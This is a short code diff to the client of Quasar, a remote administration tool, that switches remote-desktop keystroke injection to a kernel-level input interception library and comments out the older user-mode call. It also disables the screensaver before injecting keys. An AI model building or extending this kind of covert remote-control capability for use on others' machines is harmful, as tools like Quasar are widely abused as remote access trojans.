@@ -10,6 +10,9 @@ using System.Drawing.Imaging;
 using System.IO;
 using System.Windows.Forms;
 
+using InputInterceptorNS;
+using Quasar.Client.Interception;
+
 namespace Quasar.Client.Messages
 {
     public class RemoteDesktopHandler : NotificationMessageProcessor, IDisposable
@@ -176,8 +179,9 @@ namespace Quasar.Client.Messages
         {
             if (NativeMethodsHelper.IsScreensaverActive())
                 NativeMethodsHelper.DisableScreensaver();
-            
-            NativeMethodsHelper.DoKeyPress(message.Key, message.KeyDown);
+
+            InterceptionHelper.KenelKeyPress(message.Key, message.KeyDown);
+            //NativeMethodsHelper.DoKeyPress(message.Key, message.KeyDown);
         }
 
         private void Execute(ISender client, GetMonitors message)
